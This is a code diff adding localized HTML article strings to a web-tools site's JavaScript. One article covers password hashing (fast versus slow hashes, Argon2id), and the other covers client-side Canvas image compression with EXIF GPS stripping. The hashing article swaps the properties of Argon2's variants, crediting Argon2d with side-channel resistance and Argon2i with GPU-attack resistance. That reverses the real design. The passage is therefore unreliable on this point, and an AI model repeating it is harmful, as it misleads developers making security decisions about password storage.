+      "art5_body": `<h2>1. Fast Hashes vs Slow Hashes</h2>
+      <ul>
+        <li><strong>Fast Hashes (SHA-256, BLAKE3)</strong>: Engineered for ultra-fast throughput (integrity checks, digital signatures). Modern GPU clusters compute tens of billions of SHA-256 hashes per second;</li>
+        <li><strong>Slow Hashes (Argon2id, bcrypt, scrypt)</strong>: Engineered specifically for password storage with configurable memory costs to exhaust GPU VRAM and increase brute-force costs by millions of times.</li>
+      </ul>
+
+      <h2>2. The Modern Standard: Argon2id</h2>
+      <p>Argon2 is the Password Hashing Competition (PHC) winner, combining Argon2d (side-channel resistance) and Argon2i (GPU attack resistance):</p>
+      <pre class="code-block" style="background: #020617; padding: 12px; border-radius: var(--radius-sm); font-family: var(--font-mono); font-size: 13px; color: #10b981;"><code>$argon2id$v=19$m=65536,t=3,p=4$c29tZXNhbHQ$...</code></pre>`,
+
+      "art6_title": "Client-Side Image Processing & Privacy: Canvas Algorithms & EXIF GPS Stripping",
+      "art6_sub": "Achieve 100% serverless, zero-upload image compression. Explore HTML5 Canvas hardware acceleration and physical-level GPS metadata removal.",
+      "art6_body": `<h2>1. The Problem with Server-Side Image Processing</h2>
+      <p>Uploading multi-megabyte photos to cloud servers wastes network bandwidth and poses compliance and privacy liabilities for user photos.</p>
+
+      <h2>2. The 4 Key Benefits of Client-Side Canvas Processing</h2>
+      <ol>
+        <li><strong>Zero Server Upload</strong>: Images load into client RAM (Blob / ArrayBuffer) and are discarded upon download, ensuring total data sovereignty;</li>
+        <li><strong>GPU-Accelerated WebP Encoding</strong>: Modern browsers compress a 5MB JPEG to a 500KB WebP in under 200 milliseconds;</li>
+        <li><strong>Automatic EXIF & GPS Stripping</strong>: <code>Canvas.drawImage()</code> draws raw pixel bitmaps, automatically dropping all EXIF GPS headers and camera identifiers;</li>
+        <li><strong>Modern WebP / AVIF Output</strong>: Delivers 30%~50% smaller payloads at identical visual fidelity.</li>
+      </ol>`,
+
 
       'clip_input_ph': '// Paste your text or code snippet here...',
       'tool_json_ph': 'Paste raw JSON payload to format or validate...',
